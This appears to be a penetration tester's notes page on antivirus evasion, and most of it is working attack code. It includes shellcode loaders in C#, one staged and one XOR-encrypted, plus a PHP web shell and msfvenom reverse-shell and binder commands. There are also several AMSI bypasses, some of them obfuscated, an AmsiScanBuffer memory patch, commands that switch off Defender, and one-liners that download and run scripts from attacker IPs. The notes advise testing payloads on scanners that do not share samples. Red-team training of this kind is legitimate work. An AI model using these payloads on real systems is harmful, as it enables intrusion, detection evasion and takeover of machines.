# AV Evasion

#### [https://github.com/chvancooten/OSEP-Code-Snippets](https://github.com/chvancooten/OSEP-Code-Snippets)

#### [https://arty-hlr.com/blog/2021/05/06/how-to-bypass-defender/](https://arty-hlr.com/blog/2021/05/06/how-to-bypass-defender/)

{% code overflow="wrap" fullWidth="true" %}
```bash
# YOUTUBE PLAYLIST
https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf

https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process
https://blog.f-secure.com/memory-injection-like-a-boss/
https://en.wikipedia.org/wiki/Windows_API
https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-openprocess
https://en.wikipedia.org/wiki/Handle_(computing)
https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createremotethread
https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya
https://www.andreafortuna.org/2017/12/08/what-is-reflective-dll-injection-and-how-can-be-detected/
https://ired.team/offensive-security/code-injection-process-injection/process-hollowing-and-pe-image-relocations
https://www.microsoft.com/security/blog/2019/09/03/deep-learning-rises-new-methods-for-detecting-malicious-powershell/
https://cloudblogs.microsoft.com/microsoftsecure/2018/03/01/finfisher-exposed-a-researchers-tale-of-defeating-traps-tricks-and-complex-virtual-machines/

https://cmepw.github.io/BypassAV/
https://book.hacktricks.xyz/windows-hardening/av-bypass
https://github.com/backlion/Offensive-Security-OSCP-Cheatsheets/blob/master/offensive-security/av-bypass-with-metasploit-templates.md
https://github.com/sinfulz/JustEvadeBro
https://antiscan.me/scan/new/result?id=MlpqAEXx9ohJ
https://sushant747.gitbooks.io/total-oscp-guide/content/bypassing_antivirus.html
https://amsi.fail/
https://happycamper84.medium.com/tryhackme-av-evasion-shellcode-walthrough-44c7206f17f0
https://www.hackercoolmagazine.com/bypass-antivirus-with-veil-evasion-and-hack-a-remote-pc/
RoseSecurity/Anti-Virus-Evading-Payloads

https://hiddenlayer.com/innovation-hub/novel-universal-bypass-for-all-major-llms/
https://medium.com/@andreabocchetti88/ghosting-amsi-cutting-rpc-to-disarm-av-04c26d67bb80
https://github.com/BlackSnufkin/LitterBox

# TOOLS
https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader
https://github.com/Hackplayers/Salsa-tools/


# IN-MEMORY INJECTION
First part importing Windows APIs in PowerShell
Second part Memory allocation and payload writing using Windows APIs in PowerShell


# VEIL
https://cyberarms.wordpress.com/2018/05/29/anti-virus-bypass-with-veil-on-kali-linux/
https://github.com/Veil-Framework/Veil
apt -y install veil
/usr/share/veil/config/setup.sh --force --silent
veil> use evasion # use evasion tool
Veil/Evasion>: list # list payloads
# Then select a payload, generate and copy the output source file to use it
```
{% endcode %}

```
https://www.eicar.org/download-anti-malware-testfile/
```

Once we know the OS version and AV of the target, we would then attempt to replicate this environment in a virtual machine which we can use to test payloads against. Note that we should _always_ disable any kind of cloud-based protection in the AV settings (potentially by outright disconnecting the VM from the internet) so that the AV doesn't upload our carefully crafted payloads to a server somewhere for analysis, destroying all our hard work. Once we have a working payload, we can then deploy it against the target!

[https://github.com/t3l3machus/hoaxshell](https://github.com/t3l3machus/hoaxshell)

## AppLocker Bypasses

[https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md)

### Disable AV / Real-time protection

```
sc stop WinDefend
Set-MpPreference -DisableRealtimeMonitoring $true
```

## PHP Obfuscator

There are a variety of measures we could take here, including but not limited to:

* Switching parts of the exploit around so that they're in an unusual order
* Encoding all of the strings so that they're not recognisable
* Splitting up distinctive parts of the code (e.g. `shell_exec($_GET[...])`)

```bash
#Code to enter on the obfuscator
<?php
    $cmd = $_GET["command"];
    if(isset($cmd)){
        echo "<pre>" . shell_exec($cmd) . "</pre>";
    }
    die();
?>
```

&#x20;[https://www.gaijin.at/en/tools/php-obfuscator](https://www.gaijin.at/en/tools/php-obfuscator)&#x20;

{% content-ref url="../../enumeration/web-technologies/php.md" %}
[php.md](../../enumeration/web-technologies/php.md)
{% endcontent-ref %}

{% content-ref url="../../enumeration/web-pentesting/file-upload.md" %}
[file-upload.md](../../enumeration/web-pentesting/file-upload.md)
{% endcontent-ref %}

**Hunt for Malicious Strings** (use it to improve our evasion) [https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)

{% hint style="info" %}
Add two single quotes in the middle of a command does not affect its execution on Windows environments (e.g., dir and d''ir) so for PS iex it is better to do ie''x

Use msfvenom with **reverse\_https** which is encrypted (and use a certificate owned by us from a legitimate domain to sign the revshell, self-signed certs can be flagged by TLS proxies on enterprise environments)
{% endhint %}

[https://github.com/dievus/PowerShellRunner](https://github.com/dievus/PowerShellRunner)

[https://github.com/0MrRoot0/PowershellBasicRunner](https://github.com/0MrRoot0/PowershellBasicRunner)

## Netcat

[https://github.com/int0x33/nc.exe/](https://github.com/int0x33/nc.exe/)

## Powercat

[https://systemweakness.com/evade-windows-defender-reverse-shell-detection-6fa9f5eee1d1?gi=68ef3f4491d3](https://systemweakness.com/evade-windows-defender-reverse-shell-detection-6fa9f5eee1d1?gi=68ef3f4491d3)

## PowerShell Reverse Shell

[https://github.com/martinsohn/PowerShell-reverse-shell](https://github.com/martinsohn/PowerShell-reverse-shell)

## Static Detection

A static detection technique is the simplest type of Antivirus detection, which is based on predefined signatures of malicious files. Simply, it uses pattern-matching techniques in the detection, such as finding a unique string, CRC (Checksums), sequence of bytecode/Hex values, and Cryptographic hashes (MD5, SHA1, etc.).

It then performs a set of comparisons between existing files within the operating system and a database of signatures. If the signature exists in the database, then it is considered malicious. This method is effective against static malware.

## Dynamic Detection

The dynamic detection approach is advanced and more complicated than static detection. Dynamic detection is focused more on checking files at runtime using different methods such as Windows APIs calls, sandboxing...

## Heuristic and Behavioral Detection

Heuristic and behavioral detection have become essential in today's modern AV products. Modern AV software relies on this type of detection to detect malicious software. The heuristic analysis uses various techniques, including static and dynamic heuristic methods:

Static Heuristic Analysis is a process of decompiling (if possible) and extracting the source code of the malicious software. Then, the extracted source code is compared to other well-known virus source codes. These source codes are previously known and predefined in a heuristic database. If a match meets or exceeds a threshold percentage, the code is flagged as malicious.

Dynamic Heuristic Analysis is based on predefined behavioral rules. Security researchers analyzed suspicious software in isolated and secured environments. Based on their findings, they flagged the software as malicious. Then, behavioral rules are created to match the software's malicious activities within a target machine.

## AV TESTING

{% hint style="info" %}
The best option is to recreate the target AV and test locally without Internet connection and/or disable automatic sample submission on WinDef
{% endhint %}

[https://www.virustotal.com/](https://www.virustotal.com/)

They share everything so it is better to test on sites that do not share information, such as:

* [AntiscanMe](https://antiscan.me/) (6 free scans a day)
* [Virus Scan Jotti's malware scan](https://virusscan.jotti.org/)

| Antivirus Name     | Service Name                      | Process Name                       |
| ------------------ | --------------------------------- | ---------------------------------- |
| Microsoft Defender | WinDefend                         | MSMpEng.exe                        |
| Trend Micro        | TMBMSRV                           | TMBMSRV.exe                        |
| Avira              | AntivirService, Avira.ServiceHost | avguard.exe, Avira.ServiceHost.exe |
| Bitdefender        | VSSERV                            | bdagent.exe, vsserv.exe            |
| Kaspersky          | AVP\<Version #>                   | avp.exe, ksde.exe                  |
| AVG                | AVG Antivirus                     | AVGSvc.exe                         |
| Norton             | Norton Security                   | NortonSecurity.exe                 |
| McAfee             | McAPExe, Mfemms                   | MCAPExe.exe, mfemms.exe            |
| Panda              | PavPrSvr                          | PavPrSvr.exe                       |
| Avast              | Avast Antivirus                   | afwServ.exe, AvastSvc.exe          |

[SharpEDRChecker](https://github.com/PwnDexter/SharpEDRChecker)

## Determine which AV is installed

{% code overflow="wrap" fullWidth="true" %}
```csharp
using System;
using System.Management;

internal class Program
{
    static void Main(string[] args)
    {
        var status = false;
        Console.WriteLine("[+] Antivirus check is running .. ");
        string[] AV_Check = { 
            "MsMpEng.exe", "AdAwareService.exe", "afwServ.exe", "avguard.exe", "AVGSvc.exe", 
            "bdagent.exe", "BullGuardCore.exe", "ekrn.exe", "fshoster32.exe", "GDScan.exe", 
            "avp.exe", "K7CrvSvc.exe", "McAPExe.exe", "NortonSecurity.exe", "PavFnSvr.exe", 
            "SavService.exe", "EnterpriseService.exe", "WRSA.exe", "ZAPrivacyService.exe" 
        };
        var searcher = new ManagementObjectSearcher("select * from win32_process");
        var processList = searcher.Get();
        int i = 0;
        foreach (var process in processList)
        {
            int _index = Array.IndexOf(AV_Check, process["Name"].ToString());
            if (_index > -1)
            {
                Console.WriteLine("--AV Found: {0}", process["Name"].ToString());
                status = true;
            }
            i++;
        }
        if (!status) { Console.WriteLine("--AV software is not found!");  }
    }
}
```
{% endcode %}

## Shellcode

[https://learn.microsoft.com/en-us/windows/win32/debug/pe-format](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format)

**PE-Bear**: software to check PE structure

Shellcode is a set of injected crafted machine code instructions that tell the vulnerable program to run additional functions and, in most cases, provide access to a system shell or create a reverse command shell.

```wasm
# Assembly code example
global _start

section .text
_start:
    jmp MESSAGE      ; 1) let's jump to MESSAGE

GOBACK:
    mov rax, 0x1
    mov rdi, 0x1
    pop rsi          ; 3) we are popping into `rsi`; now we have the
                     ; address of "THM, Rocks!\r\n"
    mov rdx, 0xd
    syscall

    mov rax, 0x3c
    mov rdi, 0x0
    syscall

MESSAGE:
    call GOBACK       ; 2) we are going back, since we used `call`, that means
                      ; the return address, which is, in this case, the address
                      ; of "THM, Rocks!\r\n", is pushed into the stack.
    db "THM, Rocks!", 0dh, 0ah 

#'""
# To create an executable file from assembly code
nasm -f elf64 thm.asm # compile asm file for 64-bits Linux
ld thm.o -o thm # link object code (.o file) to have a working executable file
./thm
objdump -d thm # extract shellcode of the binary
objcopy -j .text -O binary thm thm.text # extract hex value from .text section
xxd -i thm.txt # to convert shellcode from binary to hex

# To confirm hex shellcode works, we can execute it and inject it into a C program:
#include <stdio.h>

int main(int argc, char **argv) {
    unsigned char message[] = {
        0xeb, 0x1e, ...
    };
    
    (*(void(*)())message)();
    return 0;
}

# Then we compile it
gcc -g -Wall -z execstack thm.c -o thmx
./thmx
```

## Generate shellcode

```csharp
msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f c
# Enter the shellcode in the following code snippet
#include <windows.h>
char stager[] = {
"\xfc\xe8\.." };
int main()
{
        DWORD oldProtect;
        VirtualProtect(stager, sizeof(stager), PAGE_EXECUTE_READ, &oldProtect);
        int (*shellcode)() = (int(*)())(void*)stager;
        shellcode();
}
# Compile it as exe file
i686-w64-mingw32-gcc calc.c -o calc-MSF.exe
```

## Staged Payloads

In general, stageless payloads are better suited for networks with lots of perimeter security, as it doesn't rely on having to download the final shellcode from the Internet.

Staged payloads, on the other hand, are great when you want your footprint on the local machine to be reduced to a minimum. Since they execute the final payload in memory, some AV solutions might find it harder to detect them. They are also great for avoiding exposing your shellcodes (which usually take considerable time to prepare), as the shellcode isn't dropped into the victim's disk at any point (as an artifact).

{% code overflow="wrap" fullWidth="true" %}
```csharp
# Full staged payload
using System;
using System.Net;
using System.Text;
using System.Configuration.Install;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;

public class Program {
  //https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualalloc 
  [DllImport("kernel32")]
  private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

  //https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createthread
  [DllImport("kernel32")]
  private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

  //https://docs.microsoft.com/en-us/windows/desktop/api/synchapi/nf-synchapi-waitforsingleobject
  [DllImport("kernel32")]
  private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

  private static UInt32 MEM_COMMIT = 0x1000;
  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

  public static void Main()
  {
    string url = "https://ATTACKER_IP/shellcode.bin";
    Stager(url);
  }

  public static void Stager(string url)
  {

    WebClient wc = new WebClient();
    ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
    ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

    byte[] shellcode = wc.DownloadData(url);

    UInt32 codeAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    Marshal.Copy(shellcode, 0, (IntPtr)(codeAddr), shellcode.Length);

    IntPtr threadHandle = IntPtr.Zero;
    UInt32 threadId = 0;
    IntPtr parameter = IntPtr.Zero;
    threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);

    WaitForSingleObject(threadHandle, 0xFFFFFFFF);

  }
}

# Compile the code
PS C:\> csc staged-payload.cs
# Generate shellcode
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=7474 -f raw -o shellcode.bin -b '\x00\x0a\x0d'
# Set up HTTPS server
openssl req -new -x509 -keyout localhost.pem -out localhost.pem -days 365 -nodes
python3 -c "import http.server, ssl;server_address=('0.0.0.0',443);httpd=http.server.HTTPServer(server_address,http.server.SimpleHTTPRequestHandler);httpd.socket=ssl.wrap_socket(httpd.socket,server_side=True,certfile='localhost.pem',ssl_version=ssl.PROTOCOL_TLSv1_2);httpd.serve_forever()"
```
{% endcode %}

## Shellcode Encoding and Encryption

{% code overflow="wrap" fullWidth="true" %}
```csharp
# Encoding - This will be detected by current AVs
msfvenom -a x86 --platform Windows LHOST=ATTACKER_IP LPORT=443 -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f csharp
# Encryption using msfvenom
msfvenom --list encrypt
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=7788 -f exe --encrypt xor --encrypt-key "MyZekr3tKey***" -o xored-revshell.exe
# msfvenom encoding/encryption are easily detectable, better custom payload

# Creating a custom payload -> generate revshell with msfvenom
msfvenom LHOST=ATTACKER_IP LPORT=443 -p windows/x64/shell_reverse_tcp -f csharp
# The encoder (replace buf variable with the shellcode generated from msfvenom)
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Encrypter
{
    internal class Program
    {
        private static byte[] xor(byte[] shell, byte[] KeyBytes)
        {
            for (int i = 0; i < shell.Length; i++)
            {
                shell[i] ^= KeyBytes[i % KeyBytes.Length];
            }
            return shell;
        }
        static void Main(string[] args)
        {
            //XOR Key - It has to be the same in the Droppr for Decrypting
            string key = "THMK3y123!";

            //Convert Key into bytes
            byte[] keyBytes = Encoding.ASCII.GetBytes(key);

            //Original Shellcode here (csharp format)
            byte[] buf = new byte[460] { 0xfc,0x48,0x83,..,0xda,0xff,0xd5 };

            //XORing byte by byte and saving into a new array of bytes
            byte[] encoded = xor(buf, keyBytes);
            Console.WriteLine(Convert.ToBase64String(encoded));        
        }
    }
}

# Compile and execute the encoder
C:\> csc.exe Encrypter.cs
C:\> .\Encrypter.exe
qKDPSzN5UbvWEJQsxhsD8mM+uHNAwz9jPM57FAL....pEvWzJg3oE=
# Self-decoding payload

using System;
using System.Net;
using System.Text;
using System.Runtime.InteropServices;

public class Program {
  [DllImport("kernel32")]
  private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

  [DllImport("kernel32")]
  private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

  [DllImport("kernel32")]
  private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

  private static UInt32 MEM_COMMIT = 0x1000;
  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
  
  private static byte[] xor(byte[] shell, byte[] KeyBytes)
        {
            for (int i = 0; i < shell.Length; i++)
            {
                shell[i] ^= KeyBytes[i % KeyBytes.Length];
            }
            return shell;
        }
  public static void Main()
  {

    string dataBS64 = "qKDPSzN5UbvWEJQsxhsD8mM+uHNAwz9jPM57FAL....pEvWzJg3oE=";
    byte[] data = Convert.FromBase64String(dataBS64);

    string key = "THMK3y123!";
    //Convert Key into bytes
    byte[] keyBytes = Encoding.ASCII.GetBytes(key);

    byte[] encoded = xor(data, keyBytes);

    UInt32 codeAddr = VirtualAlloc(0, (UInt32)encoded.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    Marshal.Copy(encoded, 0, (IntPtr)(codeAddr), encoded.Length);

    IntPtr threadHandle = IntPtr.Zero;
    UInt32 threadId = 0;
    IntPtr parameter = IntPtr.Zero;
    threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);

    WaitForSingleObject(threadHandle, 0xFFFFFFFF);

  }
}

# Let's compile our payload with the following command on the Windows machine:
csc.exe EncStageless.cs
```
{% endcode %}

## Hyperion (Encrypter)

[https://www.kali.org/tools/hyperion/\
https://nullsecurity.net/tools/binary.html\
https://github.com/jivoi/pentest/blob/master/shell/hyperion\_crypter.sh\
https://rafaelhart.com/2019/10/installing-hyperion-on-kali-linux/](https://www.kali.org/tools/hyperion/https://nullsecurity.net/tools/binary.htmlhttps://github.com/jivoi/pentest/blob/master/shell/hyperion_crypter.shhttps://rafaelhart.com/2019/10/installing-hyperion-on-kali-linux/)

## Packers

Another method to defeat disk-based AV detection is to use a packer. **Packers** are pieces of software that take a program as input and transform it so that its structure looks different, but their functionality remains exactly the same.

* Compress the program so that it takes up less space.
* Protect the program from reverse engineering in general.

{% code overflow="wrap" fullWidth="true" %}
```csharp
# Packing Payload Code (UnEncStagelessPayload.cs)
using System;
using System.Net;
using System.Text;
using System.Configuration.Install;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;

public class Program {
  [DllImport("kernel32")]
  private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

  [DllImport("kernel32")]
  private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

  [DllImport("kernel32")]
  private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

  private static UInt32 MEM_COMMIT = 0x1000;
  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

  public static void Main()
  {
    byte[] shellcode = new byte[] {0xfc,0x48,0x83,...,0xda,0xff,0xd5 };


    UInt32 codeAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    Marshal.Copy(shellcode, 0, (IntPtr)(codeAddr), shellcode.Length);

    IntPtr threadHandle = IntPtr.Zero;
    UInt32 threadId = 0;
    IntPtr parameter = IntPtr.Zero;
    threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);

    WaitForSingleObject(threadHandle, 0xFFFFFFFF);

  }
}
```
{% endcode %}

### ConfuserEx

{% code overflow="wrap" fullWidth="true" %}
```bash
https://happycamper84.medium.com/tryhackme-av-evasion-shellcode-walthrough-44c7206f17f0
# Generate shellcode
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=443 -f csharp

# Copy the shellcode content replacing {0x..,0x..} from the following file.cs
using System;
using System.Net;
using System.Text;
using System.Configuration.Install;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;

public class Program {
  [DllImport("kernel32")]
  private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

  [DllImport("kernel32")]
  private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

  [DllImport("kernel32")]
  private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

  private static UInt32 MEM_COMMIT = 0x1000;
  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

  public static void Main()
  {
    byte[] shellcode = new byte[] {
0xfc,0x48,...,0x52,
...
0x6e,0x64,0x20,0x2f,0x61,0x64,0x64,0x00};


    UInt32 codeAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    Marshal.Copy(shellcode, 0, (IntPtr)(codeAddr), shellcode.Length);

    IntPtr threadHandle = IntPtr.Zero;
    UInt32 threadId = 0;
    IntPtr parameter = IntPtr.Zero;
    threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);

    WaitForSingleObject(threadHandle, 0xFFFFFFFF);

  }
}

# Compile it
C:\Users\commando\Desktop>c:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe UnEncStagelessPayload.cs

# Download ConfuserEx from https://github.com/mkaring/ConfuserEx/releases, run it, then drag & drop the *.exe into the window. 
# Navigate to the Settings Tab, check packer and select compressor as enabled. Add a rule and set the preset to Maximum. 
# Go to the Protect tab and hit Protect.

#Then upload the .exe to the target using SMB share or certutil and you the file should be uploaded successfully since it is not flagged as malicious
```
{% endcode %}

In case, after unpacking, AVs detect it doing in-memory scanning:

* **Just wait a bit**. Try spawning the reverse shell again and wait for around 5 minutes before sending any command. AVs do not scan memory for a long time.
* **Use smaller payloads**. The smaller the payload, the less likely it is to be detected. If you use msfvenom to get a single command executed instead of a reverse shell, the AV will have a harder time detecting it. You can try with `msfvenom -a x64 -p windows/x64/exec CMD='net user pwnd Password321 /add;net localgroup administrators pwnd /add' -f csharp` and see what happens.

If detection isn't an issue, you can even use a simple trick. From your reverse shell, run `cmd.exe` again. The AV will detect your payload and kill the associated process, but not the new cmd.exe you just spawned.

## Binders

{% code overflow="wrap" %}
```sh
msfvenom -x WinSCP.exe -k -p windows/shell_reverse_tcp lhost=ATTACKER_IP lport=7779 -f exe -o WinSCP-evil.exe
```
{% endcode %}

## AMSI Bypass

AMSI is instrumented only in memory and not on disk (for that Windows Defender). If AMSI detects a malicious result:

{% code overflow="wrap" fullWidth="true" %}
```powershell
https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell
https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/
PS C:Users\Tryhackme> 'Invoke-Hacks'
...
This script contains malicious content and has been blocked by your antivirus software.


powershell iex(iwr -usebasicparsing 10.10.14.2/amsibypass.ps1);iex(iwr -usebasicparsing 10.10.14.2/rev.ps1)


# PowerShell Downgrade
https://github.com/trustedsec/unicorn
PowerShell -Version 2
# PowerShell Reflection
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
# Patching AMSI Bypass
https://github.com/rasta-mouse/AmsiScanBufferBypass
https://rastamouse.me/memory-patching-amsi-bypass/
# Automation tools
http://amsi.fail/
https://github.com/RythmStick/AMSITrigger
C:\Users\Tryhackme\Tools>AmsiTrigger_x64.exe -i "bypass.ps1" -f 3

# Try this to check if AMSI blocks or detects malware
PS > 'AmsiUtils'
PS > 'Invoke-Mimikatz'


nxc 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable'  --amsi-bypass /path/payload

# Patching amsi.dll AmsiScanBuffer by rasta-mouse
$Win32 = @"

using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@

Add-Type $Win32

$LoadLibrary = [Win32]::LoadLibrary("amsi.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "AmsiScanBuffer")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)


# After issuing that on the PS console, we can run PS scripts without touching disk
IEX(new-object system.net.webclient).downloadstring('http://192.168.56.1:8080/Invoke-winPEAS.ps1')


################ HOW TO BYPASS AMSI
# PowerShell downgrade
PS > powershell -version 2
# amsiInitFailed - another way to prevent scanning is to set the amsiInitFailed flag for the current process
$w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))
$field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static')
$field.SetValue($null,$true)
# More alternatives to amsiInitFailed
[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
$kurefii="$([cHar]([BYTe]0x53)+[ChAR](121)+[CHAr]([Byte]0x73)+[cHaR]([byte]0x74)+[Char]([bytE]0x65)+[chAR]([bYtE]0x6d)).$(('Mànägem'+'ent').NORMALiZE([cHar](70+50-50)+[ChAr](111*34/34)+[cHAr](114*7/7)+[CHar](109*71/71)+[chaR]([BYtE]0x44)) -replace [cHaR]([BYte]0x5c)+[cHar]([Byte]0x70)+[chaR]([byTE]0x7b)+[chaR](77+22-22)+[cHAr]([BytE]0x6e)+[cHaR]([BYte]0x7d)).$([chAr](65+59-59)+[ChaR](104+13)+[CHAr]([bytE]0x74)+[chAR]([byte]0x6f)+[chAr](58+51)+[ChaR]([bYTe]0x61)+[CHar]([bYTe]0x74)+[cHAR](105)+[CHaR]([BYTE]0x6f)+[cHar]([ByTE]0x6e)).$([CHAR]([ByTE]0x41)+[char]([byTe]0x6d)+[CHAr]([bYtE]0x73)+[CHar]([byTe]0x69)+[chaR](85*6/6)+[CHaR](116)+[ChAR]([Byte]0x69)+[cHAr](108)+[chAr]([BYte]0x73))";[Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType($(('$([cHar]([BYTe]0x53)+[ChAR](121)+[CHAr]([Byte]0x73)+[cHaR]([byte]0x74)+[Char]([bytE]0x65)+[chAR]([bYtE]0x6d)).Reflec'+'tíón.BìndìngF'+'lâgs').NorMALiZe([ChAR]([Byte]0x46)+[cHar](111)+[ChAR](114)+[CHar]([BYtE]0x6d)+[ChaR]([ByTE]0x44)) -replace [cHaR](92*10/10)+[CHAr](112+100-100)+[ChAR]([BYTE]0x7b)+[ChAR](77)+[cHaR](110*20/20)+[cHAr]([bYTe]0x7d)))).FullName), $([cHar]([BYTe]0x53)+[ChAR](121)+[CHAr]([Byte]0x73)+[cHaR]([byte]0x74)+[Char]([bytE]0x65)+[chAR]([bYtE]0x6d)).Reflection.FieldInfo]" -as [String].Assembly.GetType($([CHAR](83)+[char](121*78/78)+[ChAr]([ByTe]0x73)+[CHar](22+94)+[CHar](101*28/28)+[char]([BYtE]0x6d)+[CHAr](46)+[ChAr](84)+[cHAr]([ByTE]0x79)+[ChAr](90+22)+[Char](101+30-30)))), [Object]([Ref].Assembly.GetType($kurefii)),($(('Ge'+'tF'+'íe'+'ld').NOrMaliZE([char]([ByTE]0x46)+[cHAR](10+101)+[CHaR](114)+[cHAr](109*93/93)+[CHAr]([BYTe]0x44)) -replace [cHaR](92*52/52)+[CHar]([ByTE]0x70)+[CHAr]([byTe]0x7b)+[Char](38+39)+[cHaR](79+31)+[cHar](125*18/18)))).Invoke($([char](97*42/42)+[cHar](109*37/37)+[cHar]([bYte]0x73)+[Char](105+88-88)+[CHaR]([BYtE]0x49)+[ChAR](110)+[cHAR]([Byte]0x69)+[CHaR](116*14/14)+[cHar]([bYtE]0x46)+[Char](97)+[cHar]([bYTe]0x69)+[CHAR]([ByTE]0x6c)+[CHaR](101*33/33)+[char]([BYTE]0x64)),(("NonPublic,Static") -as [String].Assembly.GetType($(('$([cHar]([BYTe]0x53)+[ChAR](121)+[CHAr]([Byte]0x73)+[cHaR]([byte]0x74)+[Char]([bytE]0x65)+[chAR]([bYtE]0x6d)).Reflec'+'tíón.BìndìngF'+'lâgs').NorMALiZe([ChAR]([Byte]0x46)+[cHar](111)+[ChAR](114)+[CHar]([BYtE]0x6d)+[ChaR]([ByTE]0x44)) -replace [cHaR](92*10/10)+[CHAr](112+100-100)+[ChAR]([BYTE]0x7b)+[ChAR](77)+[cHaR](110*20/20)+[cHAr]([bYTe]0x7d))))).SetValue($null,$True);
# Hooking
https://github.com/tomcarver16/AmsiHook
SimpleInjector.exe powershell.exe injected.dll
# Memory patching
https://github.com/rasta-mouse/AmsiScanBufferBypass
https://gist.github.com/FatRodzianko/c8a76537b5a87b850c7d158728717998
https://github.com/med0x2e/NoAmci
```
{% endcode %}

## Packing your .net binary for powershell

If you don’t want to use binary from internet (and you should don’t use pre-compiled code grabbed on github on your pentest mission), you can also pack you own binary with the following script : [EncodeAssembly.ps1](https://gist.github.com/Mayfly277/2e5f34a7e7f70798d1f19c0c35f9fa0e)

```bash
. .\EncodeAssembly.ps1
